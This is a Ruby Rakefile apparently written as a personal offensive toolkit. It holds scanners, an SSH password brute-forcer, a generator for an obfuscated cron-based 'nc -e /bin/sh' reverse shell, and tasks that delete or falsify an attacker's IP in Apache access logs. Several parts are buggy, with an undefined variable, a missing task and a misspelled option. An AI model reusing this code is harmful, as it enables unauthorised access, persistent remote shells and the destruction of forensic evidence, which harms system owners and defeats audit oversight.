require 'rake'
require 'json'
require 'net/scp'
require 'base64'
require 'socket'
require 'spidr'
require 'optparse'
require 'thread'
require 'timeout'
require 'fileutils'
require 'ipaddr'
require 'net/ping'
class Config
    def initialize(file: "config.json", ssh: "cowrie")
      @file = file
      @ssh  = ssh
        if File.exist?(@file)
          j = JSON.parse(File.read(@file).to_s)
          if j.has_key?(@ssh)
            @json = j[@ssh]
          end
        end
    end
    def ip
      @json["ip"]
    end
    def uname
      @json["uname"]
    end
    def pass
      @json["pass"]
    end
    def port
      @json["port"]
    end
    def key
      @json["keys"]
    end
end
class Apache2
    def initialize(rip: nil, path: "/.env", meth: "GET", remove: nil, live: true, apache_log: "/var/log/apache2/access.log", tmp_log: "/var/log/apache2/.access.log")
        # replace IP
        @rip  = rip
        @path = path
        @meth = meth
        @live = live
        @apache_log = apache_log
        @tmp_log    = tmp_log
        FileUtils.cp(@apache_log, @tmp_log)
        File.truncate(@apache_log, 0)
    end
    def cleanup
        File.delete(@tmp_log)
    end
    def apache_log=(a)
        @apache_log = a
    end
    def log
        File.readlines(@tmp_log).to_a
    end
    def live=(l)
        @live = l
    end
    def meth=(m)
        @meth = m
    end
    def rip=(i)
        @rip = i
    end
    def path=(pp)
        @path = pp
    end
    def file_write(text)
      if @live
          if File.exists?(@apache_log)
            File.open(@apache_log, 'a') { |file| file.write(text) }
          end
      else
        File.open("access-n.log", 'a') { |file| file.write(text) }
      end
    end
    def remove
      log.each do |l|
        ip = l.split(" ")[0]
        if ip.to_s != @rip
            file_write(l)
        end
      end
    cleanup
    end
    def replace
      log.each do |l|
          ip = l.split(" ")[0]
          if ip.to_s == @rip
              line    = l.split
              line[6] = @path
              line[0] = IPAddr.new(rand(2**32),Socket::AF_INET).to_s
              line[5] = '"' + @meth
              file_write(line.join(" "))
          else
              file_write(l)
          end
      end
    cleanup
    end
end
class Brute
  def initialize(host: "", word_list: "brute.txt", found_file: "found.txt")
    @word_list  = word_list
    @host       = host
    @found_file = found_file
  end
  def run
    File.open(@word_list, "r").each_line do |l|
      if ssh(l)
        puts "logged in"
        save_file(l)
      end
    end
  end
  def ssh(l)
    begin
      Net::SSH.start(@host, l.split(":")[0], :password => l.split(":")[1], :timeout => 10, :port => 22, :number_of_password_prompts => 0) do |ssh|
        puts ssh.exec!("hostname")
        return true
      end
    rescue Net::SSH::AuthenticationFailed
      return false
    end
  end
  def save_file(l)
    File.open(@found, "a") {|f| f.write(l + "\n") }
  end
end
def ssh_tunnel_forward(ssh, args)
  require 'net/ssh'
  c      = Config.new(ssh: ssh)
  Net::SSH.start(c.ip, c.uname, :password => c.pass, :keys => c.key) do |ssh|
    ssh.forward.local(args.lip, args.lport, args.rip, args.rport)
    puts "[+] Starting SSH forward tunnel"
    ssh.loop { true }
  end
end
def port_scan(host, port)
  begin
    Timeout.timeout(3) do                    # timeout of running operation
      s = TCPSocket.new(host, port)            # Create new socket
      puts "[+] #{host} | Port #{port} open"
      s.close
    end
  rescue Errno::ENETUNREACH, Errno::ECONNREFUSED, Timeout::Error
  end
end
def ping_scan(ip_address)
  arg  = ip_address.split(".").slice(0,3).join(".")
  x    = 0
  ips  = []
  while x <  255  do
      ip = arg.to_s + "." + x.to_s
      icmp = Net::Ping::ICMP.new(ip)
      if !icmp.ping.nil?
        puts ip
        ips << ip
      end
      x += 1
  end
File.open("ping_ips.txt", "w") {|f| f.write(ips.join("\n")) }
end
desc "Monero rpc tunnel"
task :xmr, [:lip, :lport,  :rip, :rport, :ssh] do |t, args|
  args.with_defaults(:ssh => "xmr", :lip => "127.0.0.1", :lport => 3334, :rip => "127.0.0.1", :rport => 18089)
  ssh_tunnel_forward(args.ssh, args)
end
desc "SCP files"
task :scp, [:file_name, :download_path, :ssh] do |t, args|
  args.with_defaults(:ssh => "cowrie")
  c      = Config.new(ssh: args.ssh)
  Net::SSH.start(c.ip, c.uname, :password => c.pass, :port => c.port, :keys => c.key) do |ssh|
    ssh.scp.download! args.file_name, args.download_path
  end
end
desc "Nmap -sV scan"
task :sv, [:ip, :fn] do |t,args|
  args.with_defaults(:fn => "service_scan.txt")
  %x[ nmap -sV #{args.ip} -oN #{args.fn} ]
end
desc "Nmap -sU scan (UDP)"
task :udp, [:ip, :fn] do |t, args|
  args.with_defaults(:fn => "upd_scan.txt")
  %x[ nmap -sU #{args.ip} -oN #{args.fn} ]
end
desc "Reverse Shell"
task :rs, [:ip, :port] do |t, args|
   c = %Q{#!/bin/bash
        line="* * * * * nc -e /bin/sh #{args.ip} #{args.port}"
        (crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -}
  puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
end
desc "Spider crawl a website"
task :crawl, [:site] do |t, args|
  urls = []
  Spidr.site(args.site, max_depth: 7 ) do |spider|
    spider.every_url { |u| urls << u }
  end
File.open("#{args.site.gsub("https://", "").gsub("/", "")}-crawl.txt", "a") {|f| f.write(urls.join("\n")) }
end
desc "removes any .txt files"
task :clean do |t|
  Dir.glob("**/*.txt") do |i|
    File.delete(i) if File.exist?(i)
  end
end
desc "Port Scan in pure ruby."
task :ps, [:ip] do |t, args|
  ports   = (1..1024).to_a
  threads = []
  ports.each {|i| threads << Thread.new { port_scan(args.ip, i)}}
  threads.each(&:join)
end
desc "Remove IPs from Apache2 logs"
task :rmip, [:ip] do |t, args|
  a = Apache2.new(rip: args.ip, path: nil).remove
end
desc "Replace IPs in apache2 logs with a fake IP."
task :replaceip, [:ip] do |t, args|
  a = Apache2.new(rip: args.ip ).replace
end
desc "SSH brute force"
task :sshbrute, [:ip, :found_file, :wl] do |t, args|
  args.with_defaults(:found_file => "found.txt", :wl => "brute.txt")
  b = Brute.new(host: args.ip, word_list: args.wl, found_file: args.found_file).run
end
desc "ping scan.. get IPs"
task :pingscan, [:ip, :fn] do |t, args|
  args.with_defaults(:fn => "ip_pingscan.txt")
  ping_scan(args.ip)
end
options = {
  "wl": "brute.txt",
  "ffile": "found.txt",
  "fn": "ips.txt"
}
OptionParser.new do |parser|
  parser.on("--clean", "Remove any .txt files in the current directory.") do |a|
    options[:clean] = true
  end
  parser.on("--port [PORT]", "Used for ports. ( --rs )") do |b|
    options[:port]   = b
  end
  parser.on("--rs [RS]", "Reverse Shell generator") do |b|
    options[:rs]   = b
  end
  parser.on("--crawl [CRAWL]", "Crawl a website and save all the links in a text file") do |b|
    options[:crawl] = b
  end
  parser.on("--sv [SV]", "Performs a nmap scan with -sV flags") do |b|
    options[:sv] = b
  end
  parser.on("--xmr", "Monero RPC Tunnel") do |b|
    options[:xmr] = b
  end
  parser.on("--ps [PS]", "Perform a Port scan with Ruby") do |b|
    options[:ps] = b
  end
  parser.on("--scp [SCP]", "Transfer files") do |b|
    options[:scp] = b
  end
  parser.on("--dl [DL]", "Download path ( used by scp )") do |b|
    options[:dl] = b
  end
  parser.on("--ssh [SSH]", "SSH profile. ( used by SCP & xmr )") do |b|
    options[:ssh] = b
  end
  parser.on("--lport [LPORT]", "Local port ( used by xmr )") do |b|
    options[:lport] = b
  end
  parser.on("--rip [RIP]", "remote ip ( used by xmr )") do |b|
    options[:rip] = b
  end
  parser.on("--rport [RPORT]", "Remote port ( used by xmr )") do |b|
    options[:rport] = b
  end
  parser.on("--rmip [RMIP]", "Remove IP from Apache2 logs") do |b|
    options[:rmip] = b
  end
  parser.on("--replaceip [REPLACEIP]", "Replace IP in apache2 logs with a fake IP") do |b|
    options[:replaceip] = b
  end
  parser.on("--sshbrute [SSHBRUTE]", "BruteForce SSH server") do |b|
    options[:sshbrute] = b
  end
  parser.on("--wl [WL]", "Wordlist -- used by sshbrute for login wordlist") do |b|
    options[:wl] = b
  end
  parser.on("--ffile [FFILE]", "Where valid logins are stored.") do |b|
    options[:ffile] = b
  end
  parser.on("--pingscan [PINGSCAN]", "ping scan") do |b|
    options[:pingscan] = b
  end
end.parse!
if options[:clean]
  Rake::Task['clean'].invoke
end
if options[:rs]
  Rake::Task['rs'].invoke(options[:rs], options[:port])
end
if !options[:crawl].nil?
  Rake::Task['crawl'].invoke(options[:crawl])
end
if !options[:sv].nil?
  Rake::Task['sv'].invoke(options[:sv])
end
if !options[:ps].nil?
  Rake::Task['ps'].invoke(options[:ps])
end
if !options[:scp].nil?
  puts "Dont forget to add --dl filename. The program needs to know where to download the file!"     if options[:dl].nil?
  puts "Dont forget to use the --ssh argument. The program needs to know what SSH profile to use!"   if options[:ssh].nil?
  if !options[:dl].nil? && !options[:ssh].nil?
    Rake::Task['scp'].invoke(options[:scp], options[:dl], options[:ssh])
  end
end
if !options[:xmr].nil?
  puts "Dont forget to use the --lport 80 argument. The program needs to know the local port!"       if options[:lport].nil?
  puts "Dont forget to add --rip 127.0.0.1. The program needs to know where to the remote ip!"       if options[:rip].nil?
  puts "Dont forget to add --rport 80. The program needs to know where to the remote port!"          if options[:rport].nil?
  puts "Dont forget to add --ssh xmr. The program needs to know what SSH profile to use!"            if options[:ssh].nil?
  o = options
  if !options[:lport].nil? && !options[:rip].nil? && !options[:rport].nil? && !options[:ssh].nil?
    Rake::Task['xmr'].invoke(o[:xmr],o[:lport], o[:rip], o[:rport], o[:ssh])
  end
end
if !options[:rmip].nil?
  Rake::Task['rmip'].invoke(options[:rip])
end
if !options[:replaceip].nil?
  Rake::Task['replaceip'].invoke(options[:replaceip])
end
if !options[:sshbrute].nil?
  Rake::Task['sshbrute'].invoke(options[:sshrute], options[:ffile], options[:wl])
end
if !options[:pingscan].nil?
  Rake::Task['sn'].invoke(options[:pingscan], options[:fn])
end